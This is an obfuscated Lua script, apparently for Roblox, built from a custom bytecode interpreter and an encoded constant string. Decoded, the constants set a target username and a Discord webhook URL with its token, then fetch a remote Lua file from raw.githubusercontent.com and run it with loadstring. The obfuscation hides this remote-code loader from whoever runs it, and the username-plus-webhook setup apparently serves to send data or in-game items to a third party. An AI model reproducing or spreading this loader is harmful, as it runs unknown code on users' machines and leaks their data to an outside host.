do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v75=v2(v0(v30,16));if v19 then local v87=v5(v75,v19);v19=nil;return v87;else return v75;end end end);local function v20(v31,v32,v33)if v33 then local v76=(v31/((8 -6)^(v32-(3 -2))))%((2 + 0)^(((v33-(1 + (875 -(404 + 471)))) -(v32-(1 -0))) + ((375 + 1037) -(127 + 1284))));return v76-(v76%(3 -2));else local v77=(660 -(579 + 32 + 47))^(v32-(2 -1));return (((v31%(v77 + v77))>=v77) and ((1 -0) + 0)) or ((572 -(545 + 27)) -0);end end local function v21()local v38=v1(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39,v40=v1(v16,v18,v18 + (3 -1));v18=v18 + (1285 -(931 + 352));return (v40 * (999 -(489 + 254))) + v39;end local function v23()local v41,v42,v43,v44=v1(v16,v18,v18 + (851 -(499 + (579 -230))));v18=v18 + (466 -(15 + 447));return (v44 * (62154477 -(15091533 + 30285728))) + (v43 * 65536) + (v42 * ((656 -(151 + 60)) -(23 + 166))) + v41;end local function v24()local v45=v23();local v46=v23();local v47=1120 -(224 + 895);local v48=(v20(v46,4 -3,12 + 8) * (2^(1861 -((3013 -(559 + 629)) + 4)))) + v45;local v49=v20(v46,21,860 -(311 + 469 + 49));local v50=((v20(v46,79 -47)==(393 -(29 + 363))) and  -(1 + 0)) or (2 -(1 + 0));if (v49==((0 -0) -0)) then if (v48==(1212 -(381 + 121 + 710))) then return v50 * (0 -0);else v49=2 -1;v47=0 -0;end elseif (v49==(1079 + 968)) then return ((v48==0) and (v50 * ((1 + 0 + 0)/(0 -0)))) or (v50 * NaN);end return v8(v50,v49-(921 + 102)) * (v47 + (v48/((1 + 0 + (3 -2))^(32 + 20))));end local function v25(v34)local v51;if  not v34 then v34=v23();if (v34==(739 -(18 + 721))) then return "";end end v51=v3(v16,v18,(v18 + v34) -(1 + 0));v18=v18 + v34;local v52={};for v63=1, #v51 do v52[v63]=v2(v1(v3(v51,v63,v63)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53={};local v54={};local v55={};local v56={v53,v54,nil,v55};local v57=v23();local v58={};for v65=1,v57 do local v66=v21();local v67;if (v66==1) then v67=v21()~=(0 + 0);elseif (v66==(361 -(61 + 298))) then v67=v24();elseif (v66~=3) then else v67=v25();end v58[v65]=v67;end v56[13 -10]=v21();for v69=1,v23() do local v70=v21();if (v20(v70,2 -1,1 -0)~=(0 -0)) then else local v83=v20(v70,2,8 -5);local v84=v20(v70,11 -7,1172 -(661 + 505));local v85={v22(),v22(),nil,nil};if (v83==(246 -(240 + 6))) then v85[4 -1]=v22();v85[5 -1]=v22();elseif (v83==1) then v85[3]=v23();elseif (v83==(454 -(339 + 113))) then v85[1569 -(1316 + 250)]=v23() -(2^(3 + 13));elseif (v83~=3) then else v85[11 -8]=v23() -((2 + 0)^(26 -10));v85[185 -(11 + 170)]=v22();end if (v20(v84,1382 -(978 + 403),1031 -(924 + 106))==1) then v85[2 -0]=v58[v85[1 + 1]];end if (v20(v84,2,2)~=1) then else v85[3]=v58[v85[3 + 0]];end if (v20(v84,642 -(159 + 480),14 -11)==(2 -1)) then v85[11 -7]=v58[v85[4 + 0]];end v53[v69]=v85;end end for v71=1,v23() do v54[v71-(2 -1)]=v28();end for v73=1,v23() do v55[v73]=v23();end return v56;end local function v29(v35,v36,v37)local v60=v35[1];local v61=v35[2];local v62=v35[3];return function(...)local v78=1;local v79= -1;local v80={...};local v81=v12("#",...) -1;local function v82()local v88=v60;local v89=v61;local v90=v62;local v91=v27;local v92={};local v93={};local v94={};for v107=(256 -(179 + 77)) + 0,v81 do if (((2616 -1452)<1467) and (v107>=v90)) then v92[v107-v90]=v80[v107 + 1];else v94[v107]=v80[v107 + (3 -2)];end end local v95=(v81-v90) + 1;local v96;local v97;while true do v96=v88[v78];v97=v96[1 + (1448 -(386 + 1062))];if (((604 + 1041)<(5437 -(2520 -(433 + 187)))) and (v97<=(1 + 2))) then if (((5871 -3486)<=(5695 -(23 + 1403))) and (v97<=((747 -414) -(57 + 275)))) then if ((20<(2185 + 2458)) and (v97==(0 -0))) then v94[v96[2]]=v96[87 -(79 + 5)]~=(0 -0);else v94[v96[1634 -(473 + 1159)]]=v37[v96[1 + 2]];end elseif ((v97==(3 -1)) or ((3517 -((13 -8) + 5))==(6128 -(1111 + 765)))) then v37[v96[71 -((59 -29) + 30 + 8)]]=v94[v96[2 + 0]];else do return;end end elseif (((1173 + 2138)==(596 + 2715)) and (v97<=(12 -7))) then if ((v97==((7586 -5607) -(1474 + 501))) or ((846 + 756)>(9746 -6263))) then v94[v96[806 -(783 + 21)]]();else local v123=v96[2 + 0];local v124=v94[v96[2 + 1]];v94[v123 + (808 -(277 + 530))]=v124;v94[v123]=v124[v96[459 -(418 + 37)]];end elseif ((v97<=(15 -9)) or ((4345 -2780)>=(19003 -14093))) then local v128=v96[241 -(83 + 156)];v94[v128]=v94[v128](v13(v94,v128 + 1,v79));elseif (((1002 -458)<(2568 -(774 + 77))) and (v97>(1 + 6))) then v94[v96[2 + 0]]=v96[10 -7];else local v132=v96[1 + 1];local v133,v134=v91(v94[v132](v13(v94,v132 + (1626 -(662 + 963)),v96[7 -4])));v79=(v134 + v132) -((4 -3) + 0);local v135=0 -(1614 -(640 + 974));for v136=v132,v79 do v135=v135 + (753 -(636 + 116));v94[v136]=v133[v135];end end v78=v78 + 1;end end A,B=v27(v11(v82));if  not A[1] then local v98=v35[4][v78] or "?";error("Script error at ["   .. v98   .. "]:"   .. A[2]);else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!083O0003083O00557365724E616D65030C3O00656D2O70755F712O467A6B6703073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313036373O32302O383533383133363538362F684A53507943446C492O737478756639767848696F752D5F4369666C303875736551416F4533694135552O78624D47506A5841704776474F6C627930663855756B506E4B030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861726447616D6553732F5053582F6D61696E2F4E65772E6C7561000D3O0012083O00023O0012023O00013O0012083O00043O0012023O00033O0012013O00053O001201000100063O002005000100010007001208000300086O000400014O0007000100044O00065O00022O00043O000100012O00033O00017O000D3O00023O00023O00033O00033O00043O00043O00043O00043O00043O00043O00043O00043O00053O00",v9(),...);end
